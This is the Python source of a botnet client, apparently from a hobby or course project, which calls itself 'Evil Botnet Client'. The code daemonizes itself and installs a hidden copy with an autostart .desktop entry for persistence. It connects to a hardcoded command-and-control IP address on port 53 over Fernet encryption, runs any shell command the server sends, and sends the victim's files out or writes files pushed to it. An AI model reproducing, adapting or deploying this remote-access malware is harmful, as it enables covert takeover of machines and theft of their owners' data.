#!/usr/bin/python3

import os
import sys
import shutil
import socket
import subprocess
import stat
import time
from cryptography.fernet import Fernet


class client:
    # socket for connection to the server
    sock_to_server = None
    # ip address of our C&C server, can be changed depending on what ip server is located
    host = '18.205.103.236'
    # host = 'localhost'

    # port of the server to connect to, can be changed depending on what port server is listening at
    port = 53
    # port = 3000

    BUFFER_SIZE = 20480

    SEPARATOR = "<SEPARATOR>"

    #generated before-hand with Fernet
    key ='YbBugTC9pGKLMdak53p6lmy7OVp3E5qegMkMq4iPxU4='

    def __init__(self):

        # deamonize the process
        self.daemonize()

        # acquire process lock so only one instance of the daemon can exist at a time
        self.get_lock()

        # copy the file content
        self.copy_client()

        self.connect()

        while True:
            try:
                cmd = self.client_recv()

                # if downloading files
                if cmd[:8].decode("utf-8") == "download":
                    cmd_str = cmd.decode("utf-8").split(" ")
                    if len(cmd_str) > 1:
                        self.send_file(cmd_str[1])
                    else:
                        self.client_send(str.encode("Input a file"))
                    continue

                # if uploading file
                if cmd[:6].decode("utf-8") == "upload":
                    cmd_str = cmd.decode("utf-8").split(" ")
                    if len(cmd_str) > 1:
                        self.recv_file()
                    else:
                        self.client_send(str.encode("Input a file"))
                    continue

                #else runs the command
                result = self.run_command(cmd)
                self.client_send(str.encode(result))
            except Exception as error:
                client.sock_to_server.close()
                self.connect()


    def daemonize(self):
        # fork a child process
        try:
            pid = os.fork()
            if pid > 0:
                # exit first parent
                sys.exit(0)
        except Exception as error:
            print("fork failed, error: {}".format(str(error)), file=sys.stderr)
            sys.exit(1)

        # change working dir
        # os.chdir("/")
        # change session id
        os.setsid()
        # set new file permission
        os.umask(0)

        # fork again so child does not regain terminal
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(1)
        except Exception as error:
            print("fork failed, error: {}".format(str(error)), file=sys.stderr)

    def get_lock(self):
        # Without holding a reference to our socket somewhere it gets garbage
        # collected when the function exits
        self._lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        pid = os.getpid()
        process_name = "Evil Botnet Client"
        try:
            # The null byte (\0) means the the socket is created
            # in the abstract namespace instead of being created
            # on the file system itself.
            # Works only in Linux
            self._lock_socket.bind('\0' + process_name)
            print('Process lock acquired, pid is {}'.format(pid))
        except socket.error:
            print('Process already exists', file=sys.stderr)
            sys.exit()

    def copy_client(self):
        auto_config_dir = os.path.join(os.getenv("HOME"), ".config", "autostart")
        auto_config_file = os.path.join(auto_config_dir, "client.py")
        auto_config_desktop = os.path.join(auto_config_dir, "client.desktop")
        script_path = os.path.realpath(__file__)
        try:
            if not os.path.exists(auto_config_dir):
                os.mkdir(auto_config_dir)

            if not os.path.exists(auto_config_file):
                shutil.copyfile(script_path, auto_config_file)
                st = os.stat(script_path)
                os.chmod(auto_config_file, st.st_mode | stat.S_IEXEC)

            # create the autostart .desktop, this is the only way to autostart without root permission
            # a desktop environment like gnome must be present and running on client machine
            file_content = "[Desktop Entry]\n" \
                           "Name=client\n" \
                           "GenericName=client\n" \
                           "Comment=Evil Botnet\n" \
                           "Categories=Utility;\n" \
                           "Type=Application\n" \
                           "Exec={}\n" \
                           "Terminal=false\n" \
                           "NoDisplay=false\n" \
                .format(auto_config_file)

            if not os.path.exists(auto_config_desktop):
                with open(auto_config_desktop, 'w') as file:
                    file.write(file_content)
        except Exception as e:
            print("failed to copy client, error: {}".format(str(e)), file=sys.stderr)

    # note that cmd parameter is in network bytes
    def run_command(self, cmd):
        # if command from server is cd
        if cmd[:2].decode("utf-8") == "cd":
            try:
                new_dir = cmd[3:].decode("utf-8")
                if len(new_dir) == 0:
                    new_dir = os.getenv("HOME")
                os.chdir(new_dir)
                return "\n"
            except Exception as error:
                return str(error) + "\n"

        # run the command from the server
        if len(cmd) > 0:
            try:
                cmd = cmd[:].decode("utf-8")
                cmd = cmd.split(" ")
                result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result_in_bytes = result.stdout.read() + result.stderr.read()
                result_in_string = str(result_in_bytes, "utf-8")
                if len(result_in_string) == 0:
                    result_in_string = "\n"
                return result_in_string
            except Exception as error:
                return str(error) + "\n"


        # this means the command is empty, returns no result in this case
        return "\n"

    def send_file(self, filename):
        file_size = os.path.getsize(filename)
        self.client_send(f"BEGIN{filename}{client.SEPARATOR}{file_size}".encode())
        self.client_recv()
        with open(filename, "rb") as file:
            bytes = file.read(client.BUFFER_SIZE)
            while bytes:
                self.client_send(bytes)
                bytes = file.read(client.BUFFER_SIZE)

    def recv_file(self):
        # now begin the file transfer
        file_data = self.client_recv().decode()

        # sending an ack to the server
        self.client_send(" ".encode())

        # start receiving file
        file_name, file_size = file_data.split(client.SEPARATOR)
        file_name = file_name.replace("BEGIN", "")
        file_name = os.path.basename(file_name)
        file_size = int(file_size)
        with open(file_name, "wb") as file:
            bytes = self.client_recv()
            while True:
                file.write(bytes)
                file_size -= client.BUFFER_SIZE
                if file_size <= 0:
                    break
                bytes = self.client_recv()

    def connect(self):
        while True:
            try:
                client.sock_to_server = socket.socket()
                client.sock_to_server.connect((client.host, client.port))
                break
            except Exception as error:
                time.sleep(10)

    # send the msg to the server. msg is in bytes
    def client_send(self, msg):
        f = Fernet(client.key)
        encrypted = f.encrypt(msg)
        self.sock_to_server.send(encrypted)

    # receive message from the server, the returned message is in bytes
    def client_recv(self):
        f = Fernet(client.key)
        message = self.sock_to_server.recv(client.BUFFER_SIZE)
        decyrpted = f.decrypt(message)
        return decyrpted

if __name__ == '__main__':
    client()
